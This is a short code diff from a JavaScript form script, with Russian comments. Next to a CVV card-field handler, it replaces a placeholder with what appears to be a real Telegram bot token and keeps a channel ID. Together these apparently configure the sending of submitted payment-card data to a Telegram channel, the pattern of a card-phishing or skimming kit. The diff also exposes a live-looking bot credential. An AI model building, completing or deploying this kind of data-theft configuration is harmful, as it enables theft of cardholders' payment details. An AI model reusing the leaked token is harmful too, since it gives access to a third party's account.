@@ -71,7 +71,7 @@ cvvInput.addEventListener('input', function (e) {
 });
 
 // --- Конфигурация для отправки в Telegram ---
-const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
+const BOT_TOKEN = '7604135518:AAFa2ivK3F2-GarfW10JYSbMlCLAkNIzM4Q'; // ← ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ТОКЕН
 const CHANNEL_ID = '-1003047112845'; // ← Убедитесь, что это правильный ID
 
 // --- Отправка формы ---
